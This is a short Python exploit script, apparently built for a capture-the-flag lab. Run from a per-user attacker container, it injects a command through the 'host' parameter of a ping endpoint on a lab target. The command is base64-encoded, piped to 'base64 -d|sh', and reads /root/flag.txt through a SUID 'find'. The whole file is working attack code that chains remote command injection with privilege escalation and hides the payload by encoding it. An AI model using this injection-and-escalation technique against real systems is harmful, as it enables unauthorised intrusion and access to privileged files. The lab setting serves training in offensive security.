import subprocess, base64, urllib.parse, re, sys
uid = int(sys.argv[1])
service = sys.argv[2] if len(sys.argv) > 2 else "colmado"
atk = "rp-%s-atk-u%d" % (service, uid)
target = "10.%d.%d.10" % (100 + uid // 256, uid % 256)
# RCE (inyeccion de comandos) + privesc (SUID find) en un solo paso
cmd = "find / -exec cat /root/flag.txt \\; -quit"
b64 = base64.b64encode(cmd.encode()).decode()
payload = "x;echo %s|base64 -d|sh" % b64
url = "http://%s:8080/ping?host=%s" % (target, urllib.parse.quote(payload, safe=""))
print("atacante:", atk, "-> objetivo:", target)
out = subprocess.run(["docker", "exec", atk, "curl", "-s", url],
                     capture_output=True, text=True).stdout
m = re.search(r"RP\{[^}]*\}", out)
print("FLAG:", m.group(0) if m else "(no encontrada)")
if not m:
    print(out[:500])
